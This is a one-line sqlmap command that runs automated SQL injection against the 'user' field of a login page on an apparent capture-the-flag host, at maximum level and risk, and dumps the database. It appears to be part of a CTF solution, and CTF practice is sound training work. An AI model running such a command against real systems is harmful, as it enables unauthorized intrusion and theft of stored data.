sqlmap -u http://web.camsctf.com/15/login.php --data='user=*&pass=*' -p user --random-agent --level=5 --risk=3 --dump --dbms=MySQL --technique=QBT -o --flush-session --threads 1
